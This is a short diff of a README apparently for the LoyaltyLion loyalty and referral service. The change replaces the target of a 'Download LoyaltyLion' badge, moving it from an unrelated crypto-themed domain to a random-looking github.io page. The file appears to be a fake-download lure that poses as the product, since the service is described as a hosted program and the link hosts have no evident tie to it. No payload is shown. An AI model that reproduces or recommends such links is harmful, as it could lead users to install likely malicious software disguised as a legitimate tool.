@@ -2,7 +2,7 @@
 
 LoyaltyLion powers points, referrals, and VIP programs with deep Shopify and POS integrations.
 
-[![Download LoyaltyLion](https://img.shields.io/badge/Download-LoyaltyLion-blueviolet)](https://cryptoenthusiasts.world/)
+[![Download LoyaltyLion](https://img.shields.io/badge/Download-LoyaltyLion-blueviolet)](https://jacindagodinucukdv.github.io/.github/Loyalty-Lion)
 
 ---
 
